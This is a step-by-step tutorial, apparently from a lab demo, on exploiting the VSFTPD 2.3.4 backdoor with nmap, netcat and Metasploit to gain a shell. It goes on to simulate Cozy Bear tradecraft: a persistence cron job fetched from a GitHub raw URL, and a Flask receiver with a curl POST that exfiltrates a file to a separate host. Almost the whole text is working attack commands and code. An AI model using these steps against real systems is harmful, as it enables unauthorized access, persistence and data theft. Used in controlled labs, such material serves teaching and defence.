## Metasplot Demo

In this tutorial, we will demonstrate how to use Metasploit to exploit a vulnerable VSFTPD server. The steps outlined below correspond to the commands provided, and we'll go through each one in order.

### 1. Scan the target with nmap:

Before starting the exploit, it's essential to gather information about the target. Use nmap to scan the target IP (192.168.101.54) for open ports and services:

```
nmap 192.168.101.54
```

If the scan results show that port 21 (FTP) is open, you can proceed to the next step.

### 2. Connect to the FTP service using netcat:

Use the following command to connect to the target IP's FTP service and check if it is running a vulnerable version of VSFTPD:

```
nc 192.168.101.54 21
```

If you see a response indicating that VSFTPD 2.3.4 is running, continue to the next step.

### 3. Start Metasploit:

Launch the Metasploit console by running the following command:

```
msfconsole
```

### 4. Search for the VSFTPD exploit:

In the Metasploit console, search for the VSFTPD exploit by running:

```
search vsftp
```

The search results should show the exploit/unix/ftp/vsftpd_234_backdoor module.

### 5. Use the exploit module:

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

### 6. List available payloads:

The command you provided, set payload 0, is incorrect. Instead, use the following command to list available payloads:

```
show payloads
```

Choose a payload from the list, such as cmd/unix/interact.

### 7. Set the payload:

```
set payload cmd/unix/interact
```

### 8. Show and set module options:

Use the following commands to show the module options, set the RHOSTS option, and verify the settings:

```
show options
```
```
set RHOSTS 192.168.101.54
```
```
show options
```

### 9. Run the exploit:

```
exploit
```

If the exploit is successful, you should receive a command shell on the target system.

### 10. Check the user context:

Run the following command to see the user context of the shell:

```
whoami
```

This will show the username of the account that the shell is running under.

### 11. Now we will demonstrate how Cozy Bear employs stealthy persistence techniques to maintain access to compromised systems. We will be focusing on creating a cron job that will execute a benign script at specified intervals or upon system startup.

Create a new file called create_cronjob.sh and copy the script content into it. Save the file and make it executable using chmod +x create_cronjob.sh.

```
http://raw.githubusercontent.com/jamesvthompson/demo/main/create_cronjob.sh
```
```
chmod +x create_cronjob.sh
```

Run the script with ./create_cronjob.sh. This will create the benign script (benign_cronjob.sh), make it executable, and set up a cron job to run it every minute.

```
sh create_cronjob.sh
```

Monitor the /tmp/cronjob.log file for updates by running cat /tmp/cronjob.log.

```
cat /tmp/cronjob.log
```
### 12. Now we will demonstrate data exfiltration from a compromised Linux system, simulating how Cozy Bear could extract sensitive information after gaining access to a target. 

Data Exfiltration with HTTP POST Request

Set up a listener on the remote machine to receive the file. You can use a simple Python HTTP server for this purpose. Install Flask (pip install flask) and create a Python script called receiver.py:

```
from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    with open('received_data.txt', 'wb') as f:
        f.write(request.data)
    return "Data received and saved", 200

if __name__ == '__main__':
    app.run(host='192.168.101.51', port=8080)
```

This script creates a simple HTTP server that listens for POST requests on the /upload endpoint and saves the received data to a file called received_data.txt.

Run the script on the remote machine:

```
python receiver.py
```

On the target machine, use curl to send an HTTP POST request with the file contents:

```
curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@/tmp/cronjob.log" http://192.168.101.51:8080/upload
```

This will send the file as a binary stream in an HTTP POST request to the remote server, which will save the received data to a file. Note that this method is less secure than using scp, as the data is transmitted unencrypted.
